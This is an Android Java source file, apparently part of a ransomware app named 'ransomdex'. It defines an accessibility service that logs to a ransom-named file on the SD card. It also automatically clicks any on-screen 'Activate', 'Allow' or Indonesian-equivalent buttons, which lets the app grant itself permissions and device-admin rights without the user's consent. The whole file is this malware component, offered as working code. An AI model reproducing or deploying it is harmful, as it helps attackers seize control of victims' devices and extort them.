package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.List;

public class CustomAccessibilityService extends AccessibilityService {

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("Service Connected");
    }

    private void writeLog(String text) {
        try {
            File logFile = new File("/sdcard/log_ransom.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            String time = Calendar.getInstance().getTime().toString();
            fos.write((time + " : " + text + "\n").getBytes());
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        writeLog("Event: " + event.getEventType());
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        // Logika "Auto-Clicker"
        // Mencari tombol dengan teks tertentu (tergantung bahasa sistem)
        checkAndClick(rootNode, "Activate");
        checkAndClick(rootNode, "Aktifkan");
        checkAndClick(rootNode, "Allow");
        checkAndClick(rootNode, "Izinkan");
        
        rootNode.recycle();
    }

    private void checkAndClick(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo n : nodes) {
                if (n.isClickable()) {
                    writeLog("Clicking: " + text);
                    n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    n.recycle();
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}
}